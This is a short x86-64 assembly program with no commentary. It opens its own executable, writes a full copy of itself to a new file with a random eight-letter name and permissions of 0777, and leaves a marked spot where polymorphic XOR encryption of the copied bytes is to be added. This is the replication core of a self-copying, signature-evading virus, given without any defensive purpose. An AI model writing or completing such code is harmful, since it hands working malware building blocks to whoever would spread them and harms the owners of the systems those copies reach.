.intel_syntax noprefix
.globl _start

.section .text

_start:
    # --- 1. Open SELF (argv[0]) ---
    mov rdi, [rsp + 8]   
    mov rax, 2          # sys_open
    xor rsi, rsi        # O_RDONLY
    xor rdx, rdx
    syscall
    
    test rax, rax
    js Error
    mov r12, rax        # R12 = Source FD


    # --- 1. Reserve Space on Stack ---
    sub rsp, 16                 # Make room for filename (16 bytes to be safe/aligned)
    mov rdi, rsp                # RDI now points to our filename buffer

    # --- 2. Generate Random Name Loop ---
    mov rcx, 8                  # We want 8 random characters
    
RandomLoop:
    # Get a random number
    rdrand rax                  # Hardware random number generator (Intel/AMD)
    jnc RandomLoop              # If CF=0, hardware wasn't ready, try again

    # Map to 'a'-'z' (0x61 - 0x7A)
    # Fast modulo 26: (Random % 26) + 'a'
    xor rdx, rdx                # Clear RDX for division
    mov rbx, 26
    div rbx                     # Divide RAX by 26. Remainder is in RDX.
    
    add dl, 'a'                 # Add 'a' (0x61) to the remainder (0-25)
    
    # Store byte in buffer
    mov byte ptr [rdi], dl      # Write char to stack
    inc rdi                     # Move to next byte position
    
    loop RandomLoop             # Repeat 8 times

    # --- 3. Null Terminate ---
    mov byte ptr [rdi], 0       # Add \0 at the end

    # --- 4. Prepare for sys_open ---
    mov rdi, rsp                # RDI points to the start of our random string!
    
    # Now call open...
    mov rax, 2                  # sys_open
    mov rsi, 0x41               # O_CREAT | O_WRONLY
    mov rdx, 0777               # Mode
    syscall
    
    test rax, rax
    js Error
    mov r13, rax        # R13 = Dest FD

    # --- 3. allocate Small Buffer on Stack ---
    sub rsp, 4096       # Make 4KB buffer on stack
    mov r14, rsp        # R14 = Buffer Pointer

CopyLoop:
    # --- READ chunk ---
    mov rax, 0          # sys_read
    mov rdi, r12        # Source FD
    mov rsi, r14        # Buffer
    mov rdx, 4096       # Chunk Size
    syscall

    test rax, rax
    js Error            # Error
    jz CloseAndExit     # 0 means EOF (Finished!)

    mov r15, rax        # Save bytes read (might be < 4096 at end)

    # --- POLYMORPHISM / ENCRYPTION HERE ---
    # You can loop through [r14] to [r14 + r15] and XOR bytes here
    # call EncryptChunk 

    # --- WRITE chunk ---
    mov rax, 1          # sys_write
    mov rdi, r13        # Dest FD
    mov rsi, r14        # Buffer
    mov rdx, r15        # Write exactly what we read
    syscall

    jmp CopyLoop        # Repeat

CloseAndExit:
    # Close files (optional but good)
    mov rax, 3
    mov rdi, r12
    syscall
    mov rax, 3
    mov rdi, r13
    syscall

    # Exit
    mov rax, 60
    xor rdi, rdi
    syscall

Error:
    mov rax, 60
    mov rdi, 1
    syscall